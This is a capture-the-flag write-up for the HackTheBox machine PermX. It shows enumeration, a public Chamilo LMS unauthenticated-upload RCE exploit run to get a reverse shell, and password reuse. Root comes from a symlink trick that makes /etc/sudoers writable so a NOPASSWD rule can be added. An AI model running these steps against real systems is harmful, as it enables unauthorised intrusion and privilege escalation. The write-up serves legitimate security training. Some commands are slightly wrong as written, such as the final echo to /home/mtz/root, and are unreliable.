---
title: "PermX"
description: "Writeup for the 'Easy' rated machine: PermX"
date: 2024-11-16 00:00:00 +0100
categories: [CTFs, HackTheBox]
tags: [writeup, hackthebox]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/2024-11-16-writeup-htb-permx/PermX.png
---

### Overview
___
PermX is a 'Easy' rated machine where we get the foothold by exploiting, after some enumeration, a public CVE allowing us to upload arbitrary files to the server. After, that we find some database credentials in a configuration file. This password is re-used by a user on the box. Upon logging in as that user, we notice that they can run a bash script as root, allowing us to privesc to root.

### Initial nmap scan
___

```bash
nmap -A -T4 -p- -oN nmap <IP>

# Nmap 7.94SVN scan initiated Sat Aug  3 11:54:57 2024 as: nmap -A -T4 -p- -oN nmap 10.10.11.23
Warning: 10.10.11.23 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.23
Host is up (0.027s latency).
Not shown: 65484 closed tcp ports (reset), 49 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/3%OT=22%CT=1%CU=39926%PV=Y%DS=2%DC=T%G=Y%TM=66AE0
OS:129%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST1
OS:1NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   28.39 ms 10.10.14.1
2   28.81 ms 10.10.11.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  3 12:06:33 2024 -- 1 IP address (1 host up) scanned in 695.48 seconds
```

We see that we have 2 ports open:
- 22 running ssh
- 80 running an Apache server redirecting to `http://permx.htb`

Let's add it to our host file

```bash
echo -e "<IP>\tpermx.htb" >> /etc/hosts
```

### Foothold
___
Now let's navigate to `http://permx.htb`

![](/assets/img/2024-11-16-writeup-htb-permx/main_web_page.png)

After going through the different pages of site, we can notice that there nothing interesting here as there are only static pages and the form on the contact page doesn't send any data.

Let's see if the server has other vhosts

```bash
ffuf -u http://FUZZ.permx.htb -w ~/tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.permx.htb
 :: Wordlist         : FUZZ: /home/squ4r00t/tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1242ms]
:: Progress: [114441/114441] :: Job [1/1] :: 10 req/sec :: Duration: [0:10:07] :: Errors: 114440 ::
```

We got `lms` as a vhost. Let's add it to our hosts file:

```bash
echo -e "<IP>\tlms.permx.htb"
```

Navigating to the newly discovered vhost, we see a web page powered by Chamillo

![](/assets/img/2024-11-16-writeup-htb-permx/lms_page.png)

After some research, we see that it is vulnerable to [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220) which is an arbitrary file upload allowing any unauthenticated user to achieve RCE by uploading a PHP webshell to the site. This can be exploited with [this POC](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc).

```bash
# Installation / Setup
git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc.git
cd chamilo-lms-unauthenticated-big-upload-rce-poc/
pip install -r requirements.txt

# Exploitation (setup netcat listener before)
python3 main.py -u http://lms.permx.htb -a revshell
```

After running the script, we receive a shell on our netcat listener:

![](/assets/img/2024-11-16-writeup-htb-permx/foothold_shell.png)

### Privilege Escalation
___
Looking around the different files on the server, we notice some interesting ones in `/var/www/chamilo/app/config`, espacially `configuration.php` containing some database credentials:

![](/assets/img/2024-11-16-writeup-htb-permx/db_creds.png)

Under the `/home` directory we can find another user `mtz`. Let's try the password we found with this user:

```bash
ssh mtz@permx.htb
```

We successfully logged in and can now retrieve the user flag:

![](/assets/img/2024-11-16-writeup-htb-permx/user_flag.png)

Enumerating our sudo privileges as `mtz`, we can see that we can run `/opt/acl.sh` as root:

![](/assets/img/2024-11-16-writeup-htb-permx/sudo_privs.png)

Let's see the content of the script:

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

This script takes 3 arguments:
- A user
- Permissions to set
- And a target file

But the catch is that we can only set permissions of files inside `/home/mtz` and we cannot use path traversal. We can still bypass these restrictions by making use of [symbolic links](https://en.wikipedia.org/wiki/Symbolic_link).

We will first create a symbolic link to the file we want to change the permissions of. In this case, we can target the sudoers file.

```bash
ln -s /etc/sudoers /home/mtz/sudoers
```

Now let's run the script as root and change the permissions on `/home/mtz/sudoers`

```bash
sudo /opt/acl.sh mtz rw /home/mtz/sudoers
```

We are now able to edit the sudoers file. From here we can easily escalate to root, an easy way to do it is:

```bash
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
sudo su
```

And then retrieve the root flag:

![](/assets/img/2024-11-16-writeup-htb-permx/root_flag.png)

